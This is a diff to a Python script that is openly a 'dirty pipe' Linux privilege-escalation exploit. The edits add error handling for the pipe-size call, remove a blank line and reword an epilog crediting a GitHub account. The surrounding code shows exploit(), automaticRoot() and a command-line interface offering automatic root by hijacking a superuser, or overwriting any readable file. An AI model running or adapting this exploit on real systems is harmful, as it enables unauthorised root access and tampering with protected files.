@@ -4,8 +4,12 @@ PAGE_SIZE = 4096
 
 
 def preparePipe():
-    r, w = os.pipe() 
-    pipeSize = fcntl.fcntl(w, fcntl.F_GETPIPE_SZ)
+    r, w = os.pipe()
+
+    try:
+        pipeSize = fcntl.fcntl(w, fcntl.F_GETPIPE_SZ)
+    except AttributeError:
+        print("Sorry, use the 3.10 python version or above.")
 
     buffer = bytes(4096)
     i = 0
@@ -29,7 +33,6 @@ def exploit(fi, offset, data):
         print("Couldn't open file.")
         return 1
     
-
     if offset % PAGE_SIZE == 0:
         print('Sorry, cannot start writing at a page boundary.')
         return 1
@@ -83,7 +86,7 @@ def automaticRoot():
 
 
 def main():
-    parser = argparse.ArgumentParser(epilog="An offering of https://github.com/terabitSec.")
+    parser = argparse.ArgumentParser(epilog="An offering from https://github.com/terabitSec.")
     group = parser.add_mutually_exclusive_group()
     group.add_argument('-a', '--automatic', action='store_true', help="Try automatic root by hjacking an super user.")
     group.add_argument('-w', '--writeFile', nargs=3, metavar=('FILE', 'OFFSET', 'DATA'), help="Use dirty pipe exploit to write a file you can read.")
